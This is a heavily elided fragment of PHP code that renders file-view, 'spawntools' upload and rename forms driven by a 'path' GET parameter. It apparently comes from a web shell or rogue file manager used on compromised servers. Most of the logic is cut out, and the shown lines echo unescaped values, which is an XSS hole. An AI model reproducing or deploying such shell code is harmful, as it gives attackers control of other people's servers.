...
if(htmlspecialchars(isset($_GET["path"]))) {
  ...
  if($_GET["action"] == "view") {
    ...
    ?>
    <form method="POST">
      <p class="text-center">Filename: <?php echo $file_name; ?></p><br>
  ...
  elseif($_GET["action"] == "spawntools") {
    ...
    <form method="POST" enctype="multipart/form-data">
      <center>
        <label for="naxx">Choose File Here</label>
...
function renames($item, $path, $name) {
  ?>
  <form method="POST">
    <input type="text" name="newname" value="<?php echo $name; ?>" class="textinput">
